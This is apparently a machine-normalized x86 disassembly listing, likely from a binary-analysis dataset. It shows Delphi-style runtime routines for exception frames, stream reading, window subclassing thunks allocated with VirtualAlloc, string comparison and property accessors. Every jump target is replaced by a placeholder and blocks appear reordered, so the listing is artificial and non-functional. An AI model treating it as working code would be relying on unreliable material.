xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42efd0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_44b94c
xor eax eax
push ebp
push sub_42f1c3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor eax eax
push ebp
push sub_42f19c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_44748c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42f18b
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4474a8
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov [ ebp - 0x10 ] esi
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_448d2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f1ca
lea eax [ ebp + 0xc ]
call sub_44b8d8
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_448d2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_42f208
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_42f26b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42f29c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_424b88
mov edi eax
xor eax eax
push ebp
push sub_42f2f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f2f8
mov eax [ rw-data ]
call sub_424bec
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4246e8
call sub_4481b0
inc esi
dec ebx
jne r-xdata
sub_42f310
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_42f338
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4476cc
mov edx sub_42f310
lea eax [ esi + 0x5 ]
call sub_42f330
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_42f330
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_42f400
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoW
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcW
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassW
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassW
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_41d3e0
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42f338
push eax
push 0xfffffffc
push ebx
call SetWindowLongW
sub_42f4b4
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongW
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcW
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_42f3d0
sub_42f4dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f588
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f58f
retn
mov eax [ rw-data ]
call sub_423ce8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_42f29c
xor edx edx
xor eax eax
call sub_42834c
mov eax rw-data
call sub_43bfe8
call sub_4015fc
add eax 0x4
call sub_43bfe8
mov eax rw-data
call sub_43bfe8
mov eax rw-data
call sub_44b8d8
mov eax sub_42f308
call sub_44b770
mov eax rw-data
call sub_43bfe8
call sub_42d8cc
call sub_42d8e4
mov eax rw-data
call sub_43bfe8
mov eax rw-data
call sub_44b8d8
sub_42f594
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f61d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f624
retn
call sub_42d898
mov eax sub_42f308
call sub_44b768
mov dl 0x1
mov eax [ r-xdata ]
call sub_43bd14
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_44b8f0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4235e0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4249e8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4249e8
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_42f668
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_42f6ac
push [ fs : edx ]
mov [ fs : edx ] esp
lea ebx [ eax + 0x1a ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44bd80
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_449d2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f6b3
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42f6c4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42f798
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_42f6b8
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_42f6b8
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_435628
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_449d2c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_43501c
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f79f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
lea edx [ ebp - 0x8 ]
mov eax [ edi ]
call sub_434d40
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_449d2c
jmp r-xdata
add eax 0xd
test ebx ebx
je r-xdata
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44bd80
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_449d2c
movzx edx [ eax ]
inc edx
add eax edx
dec ebx
test ebx ebx
jne r-xdata
sub_42f7bc
push ebx
push esi
add esp 0xfffff800
mov esi edx
push 0x200
lea edx [ esp + 0x4 ]
push edx
movzx edx [ eax ]
push edx
inc eax
push eax
push 0x0
push 0xfde9
call MultiByteToWideChar
mov ebx eax
push 0x200
lea eax [ esp + 0x404 ]
push eax
push 0xffffffff
push esi
push 0x0
push 0xfde9
call MultiByteToWideChar
mov esi eax
push esi
lea eax [ esp + 0x404 ]
push eax
push ebx
lea eax [ esp + 0xc ]
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call CompareStringW
cmp eax 0x2
sete al
add esp 0x800
pop esi
pop ebx
retn
sub_42f830
push ebx
push esi
push edi
push 0x0
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
test [ esp ] 0x1
jne r-xdata
movzx ecx [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
push eax
push edx
mov eax esi
call sub_42f7bc
test al al
pop edx
pop eax
jne r-xdata
mov bl [ ecx + edx - 0x1 ]
test bl 0x80
jne r-xdata
pop edi
pop edi
pop esi
pop ebx
retn
movzx ecx [ esi ]
mov [ esp ] 0x1
xor bl [ ecx + esi ]
test bl 0x80
jne r-xdata
test bl 0xdf
jne r-xdata
dec ecx
jne r-xdata
jmp r-xdata
sub_42f8a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f940
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_42f6b8
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_435884
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44bafc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42f830
mov ebx eax
mov edx [ rw-data ]
mov eax esi
call sub_43501c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f947
lea eax [ ebp - 0x4 ]
call sub_449348
retn
mov edx [ rw-data ]
mov eax esi
call sub_43501c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_435884
mov ebx eax
jmp r-xdata
or ebx 0xffffffff
jmp r-xdata
sub_42f950
push ebx
push esi
push edi
push 0x0
test eax eax
je r-xdata
pop edi
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
push eax
push edx
lea eax [ eax + 0x1a ]
call sub_42f7bc
pop edx
mov cl [ edx - 0x4 ]
test al al
pop eax
je r-xdata
mov bx [ eax + 0x1a ]
test bh 0x80
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
test ch 0x80
jne r-xdata
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov [ esp ] 0x1
and ecx 0xdfff
and bh 0xdf
cmp ebx ecx
je r-xdata
test [ esp ] 0x1
jne r-xdata
mov bh 0x0
xor ch [ eax + ebx + 0x1a ]
test ch 0x80
jne r-xdata
test ch 0xdf
jne r-xdata
dec ebx
jne r-xdata
mov ch [ ebx + edx - 0x1 ]
test ch 0x80
jne r-xdata
jmp r-xdata
sub_42fa04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42fa49
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44bafc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42f950
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fa50
lea eax [ ebp - 0x4 ]
call sub_449348
retn
sub_42fa58
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_42faac
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_42fadc
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_42fb50
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_42fbac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42fc20
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
dec al
je r-xdata
mov edx edi
mov eax esi
call sub_435628
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fc27
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_435628
mov ecx [ ebp - 0x4 ]
mov eax edi
mov edx r-xdata
call sub_44a0e8
jmp r-xdata
sub al 0x7
je r-xdata
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_42f6c4
sub_42fc40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_42fd02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42f6b8
mov esi [ eax + 0x1 ]
movzx eax [ ebx ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_435884
mov ebx eax
sub ebx esi
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fd09
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub al 0x7
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_44a368
mov eax [ ebp - 0x8 ]
call sub_435884
mov ebx eax
sub ebx esi
jmp r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42f8a8
mov ebx eax
sub_42fd14
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_42fd58
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_42fdac
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_42fd14
mov eax ebx
mov edx esp
mov ecx 0x0
call sub_449600
add esp 0x100
pop ebx
retn
sub_42fddc
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_449628
mov ecx esp
mov edx esi
mov eax ebx
call sub_42fd58
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_42fe28
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_42fe10
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_42fe68
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_42fe10
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_42fea8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42fef5
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_430098
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx 0x0
call sub_449610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fefc
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
sub_42ff04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ff4c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_449b78
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4301ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ff53
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
sub_42ff5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ffa9
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4302a8
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx 0x0
call sub_449f58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ffb0
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42ffb8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_430000
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_449f30
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4303c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430007
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_430010
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
movzx ecx [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_42fdac
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_42fe28
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_42fea8
pop ebx
retn
sub cl 0x7
je r-xdata
mov ecx ebx
call sub_42ff5c
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_449348
pop ebx
retn
sub_43005c
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
movzx ebx [ ebx ]
sub bl 0x5
je r-xdata
call sub_42fddc
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_42fe68
pop ebx
retn
dec bl
je r-xdata
call sub_42ff04
pop ebx
retn
sub bl 0x7
je r-xdata
call sub_42ffb8
jmp r-xdata
pop ebx
retn
sub_430098
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43019e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4302a8
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_449f90
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4301a5
lea eax [ ebp - 0x14 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
sub al 0x7
je r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx [ ebp - 0x8 ]
mov eax esi
mov edx [ ebx ]
call sub_449a14
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4302a8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_449f90
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax esi
call sub_4499d8
mov ecx esi
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0xc ]
call [ ebp - 0x10 ]
jmp r-xdata
mov edx esi
mov eax [ ebp - 0xc ]
call [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x10 ] 0x80000000
jne r-xdata
sub_4301ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43029a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_449f7c
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_4303c0
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4302a1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_44936c
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
sub al 0x7
je r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_449a14
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_449f7c
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
